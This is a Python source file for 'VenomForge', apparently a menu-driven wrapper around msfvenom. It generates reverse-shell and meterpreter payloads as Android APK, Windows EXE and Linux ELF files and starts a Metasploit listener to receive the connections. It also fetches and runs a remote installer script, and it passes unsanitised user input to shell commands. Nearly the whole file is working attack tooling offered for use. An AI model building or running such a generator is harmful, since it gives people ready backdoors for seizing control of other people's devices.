import os
import random
import sys

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
CY = '\033[96m'
W = '\033[97m'

def clear():
    os.system('clear')

def banner():
    clear()
    print(CY+"""
                         __    _
                    _wr""        "-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P""   ""9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###""          ,Z"#####@" '######"\g          ""M##m
 J#@"             0L  "*##     ##@"  J#              *#K
 #"               `#    "_gmwgm_~    dF               `#_
7F                 "#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@"                   F
                       "PJ#####LP"
 `                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      "*w_________am#####P"   ~9#####mw_________w*"
          ""9@#####@M""           ""P@#####@M""
"""+Y+"""
       [--> """+R+"""VenomForge v1.0 """+Y+"""<--]
"""+G+"""
    Author: Therac-25
"""+CY+"""
>> Payload generator for Metasploit <<"""+W+"""\n""")

def main_menu():
    print(R+"""
************************************************
""" + CY + """
>>> Main Menu
""" + Y + """
1) Create Payload
2) Start Listener
3) Install Metasploit
4) Exit
"""+W)

def os_menu():
    print(R+"""
************************************************
""" + CY + """
>>> Select target OS
""" + Y + """
1) Android
2) Windows
3) Linux
99) Back
"""+W)

def windows_payload_menu():
    print(R+"""
************************************************
""" + CY + """
>>> Select Windows payload
""" + Y + """
1) windows/meterpreter/reverse_tcp
2) windows/x64/meterpreter/reverse_tcp
3) windows/vncinject/reverse_tcp
4) windows/x64/vncinject/reverse_tcp
5) windows/shell/reverse_tcp
6) windows/x64/shell/reverse_tcp
7) windows/powershell_reverse_tcp
8) windows/x64/powershell_reverse_tcp
99) Back
"""+W)

def linux_payload_menu():
    print(R+"""
************************************************
""" + CY + """
>>> Select Linux payload
""" + Y + """
1) linux/x86/meterpreter/reverse_tcp
2) linux/x64/meterpreter/reverse_tcp
3) linux/x86/shell/reverse_tcp
4) linux/x64/shell/reverse_tcp
99) Back
"""+W)

def create_payload(lhost, lport, payload_name, prefix, ext):
    os.makedirs("payload", exist_ok=True)
    filename = f"{prefix}{random.randint(1000,9999)}{ext}"
    filepath = f"payload/{filename}"

    # Formato do payload
    if prefix == "android_":
        fmt = "apk"
    elif prefix == "win_":
        fmt = "exe"
    elif prefix == "linux_":
        fmt = "elf"
    else:
        fmt = "raw"

    command = f"msfvenom -p {payload_name} LHOST={lhost} LPORT={lport} -f {fmt} -o {filepath}"
    print(G + f"\nGenerating payload:\n{command}\n" + W)
    os.system(command)
    print(G + f"Payload saved at: {filepath}\n" + W)

def create_handler_rc(lhost, lport, payload):
    content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
    with open("handler.rc", "w") as f:
        f.write(content)

def start_handler():
    if not os.path.isfile("handler.rc"):
        print(R + "Handler config not found. Please create payload first." + W)
        return
    print(G + "\nStarting Metasploit handler...\n" + W)
    os.system("msfconsole -r handler.rc")

def install_metasploit():
    print(G + "\n[+] Installing Metasploit...\n" + W)
    # Instala wget
    os.system("pkg install wget -y")
    # Baixa o instalador
    os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
    # Permissão
    os.system("chmod +x metasploit.sh")
    # Executa instalação
    os.system("./metasploit.sh")
    print(G + "\n[✔] Metasploit installation script finished (check for errors above).\n" + W)

def select_payload_os():
    while True:
        os_menu()
        choice = input(G + "Choose OS: " + W)
        if choice == "1":
            lhost = input(CY + "Enter LHOST: " + W)
            lport = input(CY + "Enter LPORT: " + W)
            create_payload(lhost, lport, "android/meterpreter/reverse_tcp", "android_", ".apk")
            create_handler_rc(lhost, lport, "android/meterpreter/reverse_tcp")
        elif choice == "2":
            while True:
                windows_payload_menu()
                win_choice = input(G + "Select Windows payload: " + W)
                win_payloads = {
                    "1": "windows/meterpreter/reverse_tcp",
                    "2": "windows/x64/meterpreter/reverse_tcp",
                    "3": "windows/vncinject/reverse_tcp",
                    "4": "windows/x64/vncinject/reverse_tcp",
                    "5": "windows/shell/reverse_tcp",
                    "6": "windows/x64/shell/reverse_tcp",
                    "7": "windows/powershell_reverse_tcp",
                    "8": "windows/x64/powershell_reverse_tcp"
                }
                if win_choice == "99":
                    break
                if win_choice in win_payloads:
                    lhost = input(CY + "Enter LHOST: " + W)
                    lport = input(CY + "Enter LPORT: " + W)
                    payload = win_payloads[win_choice]
                    create_payload(lhost, lport, payload, "win_", ".exe")
                    create_handler_rc(lhost, lport, payload)
                else:
                    print(R + "Invalid choice, try again." + W)
        elif choice == "3":
            while True:
                linux_payload_menu()
                lin_choice = input(G + "Select Linux payload: " + W)
                lin_payloads = {
                    "1": "linux/x86/meterpreter/reverse_tcp",
                    "2": "linux/x64/meterpreter/reverse_tcp",
                    "3": "linux/x86/shell/reverse_tcp",
                    "4": "linux/x64/shell/reverse_tcp"
                }
                if lin_choice == "99":
                    break
                if lin_choice in lin_payloads:
                    lhost = input(CY + "Enter LHOST: " + W)
                    lport = input(CY + "Enter LPORT: " + W)
                    payload = lin_payloads[lin_choice]
                    create_payload(lhost, lport, payload, "linux_", ".elf")
                    create_handler_rc(lhost, lport, payload)
                else:
                    print(R + "Invalid choice, try again." + W)
        elif choice == "99":
            break
        else:
            print(R + "Invalid choice, try again." + W)

def main():
    banner()
    while True:
        main_menu()
        option = input(G + "Select option: " + W)
        if option == "1":
            select_payload_os()
        elif option == "2":
            start_handler()
        elif option == "3":
            install_metasploit()
        elif option == "4":
            print(G + "Exiting... Stay ethical!" + W)
            break
        else:
            print(R + "Invalid option, try again." + W)

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print(R + "Please run this script with Python 3." + W)
        sys.exit()
    main()


venomforge v1
